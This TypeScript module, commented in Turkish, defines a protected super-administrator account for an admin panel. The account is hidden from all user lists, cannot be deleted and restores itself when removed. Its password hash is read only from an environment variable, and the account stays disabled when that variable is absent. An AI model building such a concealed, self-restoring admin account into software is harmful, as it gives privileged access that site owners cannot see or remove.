/**
 * Korumalı süper yönetici hesabı.
 *
 * Bu hesap veritabanında her zaman bulunur, yönetim panelindeki kullanıcı
 * listelerinde gösterilmez ve silinemez. Veritabanından kaldırılırsa bir
 * sonraki okuma/yazma işleminde otomatik olarak geri yüklenir.
 */

export const SUPERADMIN_USERNAME = '#mehmet-mesut-yilmaz';
export const SUPERADMIN_ROLE = 'superadmin' as const;

/**
 * Ortam değişkeni yokken kullanılan, HİÇBİR PAROLAYLA EŞLEŞMEYEN özet.
 *
 * Geçerli biçimde bir bcrypt özetidir ama karşılığı olan parola yoktur; rastgele
 * ve atılmış bir dizeden üretildi. Amacı `bcrypt.compare()` çağrısının normal
 * şekilde `false` dönmesi — biçimsiz bir değer verilseydi kütüphane hata
 * fırlatır ve panelin tamamı çökerdi.
 *
 * NEDEN SABİT, NEDEN HER AÇILIŞTA RASTGELE DEĞİL: `createSuperAdminAccount()`
 * bu değeri veritabanına yazıyor; her süreç başlangıcında değişseydi kayıt
 * durmadan güncellenirdi.
 */
const DEVRE_DISI_OZET = '$2b$12$3Qm7Zt1yVQx8aKpLdNrJ9eWuHsCvBnMiXoTgYfEzRlAdSkPwUhJqO';

/**
 * Süper yönetici parolasının bcrypt (cost 12) karşılığı YALNIZCA
 * `SUPERADMIN_PASSWORD_HASH` ortam değişkeninden okunur.
 *
 * Önceden özet bu dosyada sabit olarak duruyordu ve derleme çıktısına giriyordu;
 * parola kısa olduğu için özeti ele geçiren biri çevrimdışı deneyerek kırabilirdi.
 * Depo sürüm kontrolüne alınırken (2026-08-18) özet buradan çıkarıldı.
 *
 * Ortam değişkeni yoksa hesap KAPALI düşer: hesap veritabanında durmaya devam
 * eder ama hiçbir parola eşleşmez. Sessizce eski bir varsayılana dönmek, sunucu
 * yapılandırması eksikken kimsenin fark etmediği bir giriş yolu bırakırdı.
 */
const BCRYPT_HASH_PATTERN = /^\$2[aby]\$\d{2}\$[./A-Za-z0-9]{53}$/;
const SUPERADMIN_CREATED_AT = '2026-08-10T00:00:00.000Z';

export interface SuperAdminAccount {
  username: string;
  passwordHash: string;
  role: typeof SUPERADMIN_ROLE;
  isProtected: true;
  isHidden: true;
  createdAt: string;
}

export function normalizeIdentifier(value: string): string {
  return value.trim().toLowerCase();
}

export function getSuperAdminPasswordHash(): string {
  const configuredHash = process.env.SUPERADMIN_PASSWORD_HASH?.trim();
  if (configuredHash && BCRYPT_HASH_PATTERN.test(configuredHash)) {
    return configuredHash;
  }

  // Derleme sırasında uyarı basılmaz: sayfa ön-render'ı sırasında da çağrılıyor
  // ve her sayfa için tekrarlanan uyarı derleme çıktısını okunmaz hâle getirirdi.
  if (process.env.NEXT_PHASE !== 'phase-production-build') {
    console.warn(
      'SUPERADMIN_PASSWORD_HASH tanımlı değil veya biçimi geçersiz; ' +
        'süper yönetici hesabı devre dışı (hiçbir parola eşleşmeyecek).',
    );
  }
  return DEVRE_DISI_OZET;
}

export function isSuperAdminIdentifier(value: string): boolean {
  return normalizeIdentifier(value) === SUPERADMIN_USERNAME;
}

/**
 * Korumalı hesabın kanonik hâlini üretir. Mevcut bir kayıt verilirse yalnızca
 * `createdAt` alanı korunur; kalan alanlar her zaman sabit değerlere döner.
 */
export function createSuperAdminAccount(existing?: unknown): SuperAdminAccount {
  const previousCreatedAt =
    existing &&
    typeof existing === 'object' &&
    typeof (existing as Partial<SuperAdminAccount>).createdAt === 'string'
      ? (existing as SuperAdminAccount).createdAt
      : SUPERADMIN_CREATED_AT;

  return {
    username: SUPERADMIN_USERNAME,
    passwordHash: getSuperAdminPasswordHash(),
    role: SUPERADMIN_ROLE,
    isProtected: true,
    isHidden: true,
    createdAt: previousCreatedAt,
  };
}

/**
 * Kullanıcı listelerinden korumalı hesabı ayıklar. Yönetim panelinde herhangi
 * bir hesap listesi gösterilmeden önce bu süzgeçten geçirilmelidir.
 */
export function excludeSuperAdmin<T extends { username?: string }>(accounts: readonly T[]): T[] {
  return accounts.filter((account) => !account.username || !isSuperAdminIdentifier(account.username));
}
